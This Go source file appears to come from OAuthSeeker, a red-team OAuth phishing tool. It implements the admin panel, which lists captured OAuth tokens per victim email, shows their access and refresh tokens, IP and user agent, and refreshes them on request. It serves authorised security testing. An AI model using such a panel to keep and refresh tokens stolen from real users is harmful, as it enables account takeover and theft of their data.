// Copyright 2025 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package admin

import (
	"bytes"
	"io"
	"log"
	"net/http"
	"path"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/praetorian-inc/OAuthSeeker/pkg/config"
	"github.com/praetorian-inc/OAuthSeeker/pkg/database"
	"github.com/praetorian-inc/OAuthSeeker/pkg/refresh"
	"github.com/praetorian-inc/OAuthSeeker/pkg/renderer"
	"github.com/praetorian-inc/OAuthSeeker/pkg/utils"
	"github.com/praetorian-inc/OAuthSeeker/static"
)

var (
	db        *database.Database
	refresher *refresh.Refresher
)

func Initialize(config *config.Config, database *database.Database) {
	db = database
	refresher = refresh.NewRefresher(config, db)
}

func AdminMiddleware(cfg *config.Config) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			proxyHeaders := []string{
				"X-Forwarded-For",
				"X-Real-IP",
				"X-Forward-For",
			}

			for _, header := range proxyHeaders {
				if r.Header.Get(header) != "" {
					http.Error(w, "404 page not found", http.StatusNotFound)
					return
				}
			}

			if !isIPAllowlisted(utils.GetUserIP(r), cfg.AdminAllowlistIPs) {
				http.Error(w, "404 page not found", http.StatusNotFound)
				return
			}

			username, password, ok := r.BasicAuth()
			if !ok || username != cfg.AdminUsername || password != cfg.AdminPassword {
				w.Header().Set("WWW-Authenticate", `Basic realm="Admin"`)
				http.Error(w, "Unauthorized", http.StatusUnauthorized)
				return
			}

			next.ServeHTTP(w, r)
		})
	}
}

func isIPAllowlisted(ip string, allowlist []string) bool {
	for _, allowlistedIP := range allowlist {
		if ip == allowlistedIP {
			return true
		}
	}
	return false
}

func ListHandler(w http.ResponseWriter, r *http.Request) {
	tokens, err := db.ListCurrentTokens()
	if err != nil {
		log.Printf("Error listing tokens from the database: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	data := map[string]interface{}{
		"Title":  "OAuthSeeker - Captured Tokens",
		"Header": "OAuthSeeker - Captured Tokens",
		"Tokens": tokens,
	}

	generator, err := renderer.NewRenderer("list")
	if err != nil {
		log.Printf("Unable to render view for list, err: %v", err)
		return
	}

	err = generator.Render(w, data)
	if err != nil {
		log.Printf("Error rendering template: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

func ViewHandler(w http.ResponseWriter, r *http.Request) {
	email := chi.URLParam(r, "email")
	if email == "" {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	token, err := db.GetCurrentToken(email)
	if err != nil {
		log.Printf("Error getting token for email %s: %v\n", email, err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	if token == nil {
		http.NotFound(w, r)
		return
	}

	if r.Method == http.MethodPost {
		token, err = refresher.RefreshToken(token)
		if err != nil {
			log.Printf("Error refreshing token for email %s: %v\n", email, err)
			http.Error(w, "Error refreshing token", http.StatusInternalServerError)
			return
		}

		err = db.UpdateCurrentToken(*token)
		if err != nil {
			log.Printf("Error updating token for email %s: %v\n", email, err)
			http.Error(w, "Error updating token", http.StatusInternalServerError)
			return
		}
	}

	data := map[string]interface{}{
		"Title":         "OAuthSeeker - Credential Details",
		"Header":        "OAuthSeeker - Credential Details",
		"Email":         token.Email,
		"AccessToken":   token.AccessToken,
		"RefreshToken":  token.RefreshToken,
		"Expiry":        token.Expiry,
		"UserIP":        token.UserIP,
		"UserAgent":     token.UserAgent,
		"CaptureDate":   token.LastRefreshed,
		"LastRefreshed": token.LastRefreshed,
	}

	generator, _ := renderer.NewRenderer("view")
	err = generator.Render(w, data)
	if err != nil {
		log.Printf("Error rendering template: %v\n", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

func GraphRunnerHandler(w http.ResponseWriter, r *http.Request) {
	data := map[string]interface{}{
		"Title":  "OAuthSeeker - GraphRunner",
		"Header": "OAuthSeeker - GraphRunner GUI",
	}

	generator, _ := renderer.NewRenderer("graphrunner")
	err := generator.Render(w, data)
	if err != nil {
		log.Printf("Error rendering GraphRunner template: %v\n", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

func StaticFileHandler(w http.ResponseWriter, r *http.Request) {
	filePath := strings.TrimPrefix(r.URL.Path, "/admin/static/")
	cleanPath := path.Clean(filePath)
	file, err := static.AdminPanelStatic.Open("admin/static/" + cleanPath)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	defer file.Close()

	fileContent, err := io.ReadAll(file)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	reader := bytes.NewReader(fileContent)
	http.ServeContent(w, r, cleanPath, time.Now(), reader)
}
